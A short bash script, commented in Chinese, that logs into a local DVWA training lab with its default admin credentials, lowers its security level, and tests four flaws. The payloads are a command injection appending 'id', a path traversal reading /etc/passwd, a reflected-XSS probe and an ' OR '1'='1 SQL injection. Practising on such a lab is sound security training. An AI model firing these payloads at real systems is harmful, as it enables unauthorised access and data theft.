#!/bin/bash
DVWA_URL=http://192.168.127.128/DVWA
COOKIE=/tmp/dvwa_cookie.txt

echo "=== DVWA漏洞测试（改进版）==="
echo ""

# 1. 完整登录流程
echo "[1] 访问登录页..."
curl -s -c $COOKIE -L $DVWA_URL/login.php > /tmp/login_page.html
echo "[2] 提取token..."
USER_TOKEN=$(grep -o 'user_token.*value="[^"]*"' /tmp/login_page.html | grep -o 'value="[^"]*"' | cut -d'"' -f2)
echo "   Token: $USER_TOKEN"

echo "[3] 提交登录..."
curl -s -b $COOKIE -c $COOKIE -L -X POST $DVWA_URL/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$USER_TOKEN" > /tmp/after_login.html

echo "[4] 检查登录状态..."
if grep -q "Welcome to Damn Vulnerable Web App" /tmp/after_login.html; then
  echo "   ✅ 登录成功"
else
  echo "   ⚠️ 需要确认"
fi

# 读取Cookie
PHPSESSID=$(grep 'PHPSESSID' $COOKIE | awk '{print $7}')
echo "[5] PHPSESSID: $PHPSESSID"
echo ""

# 2. 设置安全级别为low
echo "[6] 设置安全级别..."
curl -s -b $COOKIE -c $COOKIE -X POST $DVWA_URL/security.php \
  -d "security=low&seclev_submit=Submit" > /dev/null
echo "   ✅ 已设置为low"
echo ""

# 3. 开始测试
echo "--- 测试1：命令注入 ---"
curl -s -b $COOKIE -X POST $DVWA_URL/vulnerabilities/exec/ -d "ip=127.0.0.1; id&Submit=Submit" | grep -A 3 -B 1 "uid="
echo ""

echo "--- 测试2：文件包含 ---"
curl -s -b $COOKIE "$DVWA_URL/vulnerabilities/fi/?page=../../../../etc/passwd" | head -5
echo ""

echo "--- 测试3：XSS反射 ---"
RESULT=$(curl -s -b $COOKIE "$DVWA_URL/vulnerabilities/xss_r/?name=test123")
if echo "$RESULT" | grep -q "test123"; then
  echo "✅ XSS输入点存在"
fi
echo ""

echo "--- 测试4：简单SQL注入测试 ---"
curl -s -b $COOKIE "$DVWA_URL/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" | head -30
echo ""

# 清理
rm -f $COOKIE /tmp/login_page.html /tmp/after_login.html
echo "=== 测试完成 ==="